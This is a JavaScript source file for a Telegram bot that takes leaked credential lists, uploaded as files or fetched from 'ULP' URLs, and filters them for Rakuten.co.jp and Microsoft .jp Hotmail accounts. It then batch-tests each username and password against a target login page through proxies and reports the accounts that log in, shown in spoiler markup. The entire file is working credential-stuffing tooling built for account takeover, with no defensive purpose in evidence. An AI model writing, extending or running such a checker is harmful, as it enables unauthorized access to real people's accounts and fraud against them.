const { Markup } = require('telegraf');
const {
  prepareBatchFromFile,
  prepareUlpBatch,
  ALLOWED_DOMAINS,
  MAX_BYTES_HOTMAIL,
  MAX_BYTES_ULP,
} = require('../automation/batchProcessor');

const BATCH_CONCURRENCY = 3;
const TELEGRAM_FILE_LIMIT_BYTES = 50 * 1024 * 1024; // Telegram bot API file limit (~50MB)
const pendingBatches = new Map();
const pendingFiles = new Map();

function codeSpan(text) {
  if (text === undefined || text === null) return '``';
  const safe = String(text).replace(/`/g, '\\`').replace(/\\/g, '\\\\');
  return `\`${safe}\``;
}

function runBatchExecution(ctx, batch, msgId, statusMsg, options, helpers, key, checkCredentials) {
  const { escapeV2, formatDurationMs } = helpers;
  const chatId = ctx.chat.id;
  const counts = { VALID: 0, INVALID: 0, BLOCKED: 0, ERROR: 0 };
  let processed = 0;
  const validCreds = [];
  const startedAt = Date.now();
  let lastProgressAt = startedAt;

  console.log(`[batch] executing file=${batch.filename} total=${batch.count}`);

  const iterator = batch.creds[Symbol.iterator]();

  const processCredential = async (cred) => {
    if (batch.aborted) return;
    let result;
    try {
      result = await checkCredentials(cred.username, cred.password, {
        timeoutMs: options.timeoutMs || 60000,
        proxy: options.proxy,
        screenshotOn: false,
        targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
        headless: options.headless,
      });
    } catch (err) {
      result = { status: 'ERROR', message: err.message };
    }

    counts[result.status] = (counts[result.status] || 0) + 1;
    processed += 1;

    if (result.status === 'VALID') {
      validCreds.push(`• ||\`${escapeV2(cred.username)}:${escapeV2(cred.password)}\`||`);
    }

    if (batch.aborted) return;

    const now = Date.now();
    const shouldUpdate =
      processed === 1 ||
      processed === batch.count ||
      processed % 5 === 0 ||
      now - lastProgressAt >= 5000;

    if (shouldUpdate) {
      const text =
        `${escapeV2('⏳ Batch progress')}` +
        `\nFile: ${codeSpan(batch.filename)}` +
        `\nProcessed: *${processed}/${batch.count}*` +
        `\n✅ VALID: *${counts.VALID || 0}*` +
        `\n❌ INVALID: *${counts.INVALID || 0}*` +
        `\n🔒 BLOCKED: *${counts.BLOCKED || 0}*` +
        `\n⚠️ ERROR: *${counts.ERROR || 0}*`;

      try {
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, text, {
          parse_mode: 'MarkdownV2',
        });
      } catch (_) {
        console.warn('Batch progress edit failed');
      }

      lastProgressAt = now;
    }
  };

  const worker = async () => {
    for (;;) {
      if (batch.aborted) return;
      const next = iterator.next();
      if (next.done) return;
      await processCredential(next.value);
    }
  };

  const execute = async () => {
    try {
      const poolSize = Math.min(BATCH_CONCURRENCY, batch.creds.length);
      await Promise.all(Array.from({ length: poolSize }, () => worker()));

      const elapsed = Date.now() - startedAt;
      const summaryTitle = batch.aborted ? '⏹️ Batch aborted' : '📊 Batch complete';
      const summary =
        `${escapeV2(summaryTitle)}` +
        `\nFile: ${codeSpan(batch.filename)}` +
        `\nTotal: *${batch.count}*` +
        `\n✅ VALID: *${counts.VALID || 0}*` +
        `\n❌ INVALID: *${counts.INVALID || 0}*` +
        `\n🔒 BLOCKED: *${counts.BLOCKED || 0}*` +
        `\n⚠️ ERROR: *${counts.ERROR || 0}*` +
        `\n🕒 Time: *${escapeV2(formatDurationMs(elapsed))}*` +
        `\n\n${escapeV2('VALID accounts:')}` +
        `\n${validCreds.length ? validCreds.join('\n') : escapeV2('• None')}`;

      try {
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, summary, {
          parse_mode: 'MarkdownV2',
        });
      } catch (err) {
        console.warn('Batch summary edit failed:', err.message);
        await ctx.reply(summary, {
          parse_mode: 'MarkdownV2',
          reply_to_message_id: Number(msgId),
        });
      }

      console.log(
        `[batch] finished file=${batch.filename} aborted=${!!batch.aborted} processed=${processed}/${batch.count} ` +
          `valid=${counts.VALID} invalid=${counts.INVALID} blocked=${counts.BLOCKED} error=${counts.ERROR} elapsed_ms=${elapsed}`
      );
    } catch (err) {
      try {
        await ctx.replyWithMarkdown(`⚠️ Batch failed: ${escapeV2(err.message)}`, {
          reply_to_message_id: Number(msgId),
        });
      } catch (_) {
        // swallow
      }
      console.warn('Batch execution error:', err.message);
      console.warn(`[batch] execution failed file=${batch.filename} msg=${err.message}`);
    } finally {
      pendingBatches.delete(key);
    }
  };

  // Schedule to avoid Telegraf 90s per-update timeout
  setTimeout(execute, 0);
}

function registerBatchHandlers(bot, options, helpers) {
  const { escapeV2, formatBytes } = helpers;
  const checkCredentials = options.checkCredentials;

  if (typeof checkCredentials !== 'function') {
    throw new Error('registerBatchHandlers requires options.checkCredentials');
  }

  bot.on('document', async (ctx) => {
    const doc = ctx.message && ctx.message.document;
    if (!doc) return;

    const chatId = ctx.chat.id;
    const sourceMessageId = ctx.message && ctx.message.message_id;

    console.log(`[batch] file received name=${doc.file_name || 'unknown'} size=${doc.file_size || 0}`);

    if (doc.file_size && doc.file_size > TELEGRAM_FILE_LIMIT_BYTES) {
      await ctx.replyWithMarkdown(
        '⚠️ File too large for Telegram bots (max ~50MB). For ULP lists, host the file and use `.ulp <url>` instead.',
        { reply_to_message_id: sourceMessageId }
      );
      return;
    }

    let fileUrl;
    try {
      const link = await ctx.telegram.getFileLink(doc.file_id);
      fileUrl = link.href || link.toString();
    } catch (err) {
      await ctx.replyWithMarkdown(
        `⚠️ Unable to get file link: ${escapeV2(err.message)}`,
        { reply_to_message_id: doc.message_id }
      );
      return;
    }

    const key = `${chatId}:${sourceMessageId}`;
    pendingFiles.set(key, {
      fileUrl,
      filename: doc.file_name || 'file.txt',
      size: doc.file_size,
      sourceMessageId,
    });

    await ctx.replyWithMarkdown(
      '📂 *File received*' +
      `\n• Name: ${codeSpan(doc.file_name || 'file')}` +
      `\n• Size: ${formatBytes(doc.file_size)}` +
      '\n\nProcess as HOTMAIL list?',
      {
        reply_to_message_id: sourceMessageId,
        ...Markup.inlineKeyboard([
          [Markup.button.callback('📧 Proceed (HOTMAIL)', `batch_type_hotmail_${sourceMessageId}`)],
          [Markup.button.callback('⛔ Cancel', `batch_cancel_${sourceMessageId}`)],
        ]),
      }
    );
  });

  bot.hears(/^\.ulp\s+(https?:\/\/\S+)/i, async (ctx) => {
    const chatId = ctx.chat.id;
    const sourceMessageId = ctx.message && ctx.message.message_id;
    const url = ctx.match[1];

    console.log(`[batch][ulp] start url=${url}`);

    if (!url || url.length > 1000) {
      await ctx.replyWithMarkdown('⚠️ Provide a valid URL after `.ulp`.', {
        reply_to_message_id: sourceMessageId,
      });
      return;
    }

    try {
      await ctx.replyWithMarkdown('⏳ Processing ULP URL (this may take a while)...', {
        reply_to_message_id: sourceMessageId,
      });
    } catch (_) {}

    let batch;
    try {
      batch = await prepareUlpBatch(url, MAX_BYTES_ULP);
      console.log(`[batch][ulp] parsed count=${batch.count}`);
    } catch (err) {
      await ctx.replyWithMarkdown(`⚠️ Failed to read URL: ${escapeV2(err.message)}`, {
        reply_to_message_id: sourceMessageId,
      });
      console.warn(`[batch][ulp] parse failed url=${url} msg=${err.message}`);
      return;
    }

    if (!batch.count) {
      await ctx.replyWithMarkdown('ℹ️ No eligible Rakuten credentials found at this URL.', {
        reply_to_message_id: sourceMessageId,
      });
      return;
    }

    const key = `${chatId}:${sourceMessageId}`;
    pendingBatches.set(key, {
      creds: batch.creds,
      filename: url,
      count: batch.count,
      sourceMessageId: Number(sourceMessageId),
    });

    await ctx.replyWithMarkdown(
      '🗂 *ULP URL parsed*' +
      `\n• Source: ${codeSpan(url.length > 120 ? `${url.slice(0, 117)}...` : url)}` +
      `\n• Eligible credentials: *${batch.count}*` +
      '\n• Filter: lines containing `rakuten.co.jp` (deduped)' +
      '\n\nProceed to check them?',
      {
        reply_to_message_id: sourceMessageId,
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback('✅ Proceed', `batch_confirm_${sourceMessageId}`),
            Markup.button.callback('⛔ Cancel', `batch_cancel_${sourceMessageId}`),
          ],
        ]),
      }
    );
  });

  bot.action(/batch_confirm_(.+)/, async (ctx) => {
    try {
      await ctx.answerCbQuery();
      const msgId = ctx.match[1];
      const key = `${ctx.chat.id}:${msgId}`;
      const batch = pendingBatches.get(key);
      if (!batch) {
        await ctx.replyWithMarkdown(
          '⚠️ Batch expired. Send the file again to restart.',
          { reply_to_message_id: Number(msgId) }
        );
        return;
      }

      const statusText =
        `${escapeV2('⏳ Starting batch check')}` +
        `\nFile: ${codeSpan(batch.filename)}` +
        `\nEntries: *${escapeV2(String(batch.count))}*`;

      const statusMsg = await ctx.reply(statusText, {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
        ...Markup.inlineKeyboard([[Markup.button.callback('⏹ Abort', `batch_abort_${msgId}`)]]),
      });

      console.log(`[batch] starting file=${batch.filename} count=${batch.count}`);

      runBatchExecution(ctx, batch, msgId, statusMsg, options, helpers, key, checkCredentials);
    } catch (err) {
      console.warn('Batch confirm handler error:', err.message);
      await ctx.replyWithMarkdown(`⚠️ Batch failed: ${escapeV2(err.message)}`, {
        reply_to_message_id: ctx.update?.callback_query?.message?.message_id,
      });
    }
  });

  bot.action(/batch_cancel_(.+)/, async (ctx) => {
    await ctx.answerCbQuery('Batch cancelled');
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    pendingBatches.delete(key);
    pendingFiles.delete(key);
    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        ctx.update.callback_query.message.message_id,
        undefined,
        '❎ Batch cancelled. Send a new file to try again.',
        { parse_mode: 'Markdown' }
      );
    } catch (_) {
      await ctx.replyWithMarkdown(
        '❎ Batch cancelled. Send a new file to try again.',
        { reply_to_message_id: Number(msgId) }
      );
    }
  });

  bot.action(/batch_type_hotmail_(.+)/, async (ctx) => {
    await ctx.answerCbQuery();
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    const file = pendingFiles.get(key);
    if (!file) {
      await ctx.replyWithMarkdown('⚠️ File info expired. Send the file again.', {
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        ctx.update.callback_query.message.message_id,
        undefined,
        '⏳ Processing HOTMAIL file...',
        { parse_mode: 'Markdown' }
      );
    } catch (_) {}

    let batch;
    try {
      batch = await prepareBatchFromFile(file.fileUrl, MAX_BYTES_HOTMAIL);
      console.log(`[batch][hotmail] parsed count=${batch.count} file=${file.filename}`);
    } catch (err) {
      await ctx.replyWithMarkdown(`⚠️ Failed to read file: ${escapeV2(err.message)}`, {
        reply_to_message_id: Number(msgId),
      });
      console.warn(`[batch][hotmail] parse failed file=${file.filename} msg=${err.message}`);
      return;
    }

    if (!batch.count) {
      await ctx.replyWithMarkdown('ℹ️ No eligible Microsoft .jp credentials found.', {
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    pendingFiles.delete(key);
    pendingBatches.set(key, {
      creds: batch.creds,
      filename: file.filename,
      count: batch.count,
      sourceMessageId: Number(msgId),
    });

    const allowedDomainsText = ALLOWED_DOMAINS.map((d) => `\`${d}\``).join(', ');
    await ctx.replyWithMarkdown(
      '📂 *HOTMAIL list parsed*' +
      `\n• Name: ${codeSpan(file.filename)}` +
      `\n• Size: ${formatBytes(file.size)}` +
      `\n• Eligible credentials: *${batch.count}*` +
      '\n• Allowed domains: ' + allowedDomainsText +
      '\n\nProceed to check them?',
      {
        reply_to_message_id: Number(msgId),
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
            Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
          ],
        ]),
      }
    );
  });

  bot.action(/batch_abort_(.+)/, async (ctx) => {
    await ctx.answerCbQuery('Aborting...');
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    const batch = pendingBatches.get(key);
    if (batch) {
      batch.aborted = true;
      console.log(`[batch] abort requested file=${batch.filename}`);
      try {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          ctx.update.callback_query.message.message_id,
          undefined,
          '⏹ Aborting batch, please wait...',
          {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([]),
          }
        );
      } catch (_) {}
    } else {
      await ctx.replyWithMarkdown('⚠️ No active batch to abort.', {
        reply_to_message_id: ctx.update.callback_query.message.message_id,
      });
    }
  });
}

module.exports = {
  registerBatchHandlers,
};
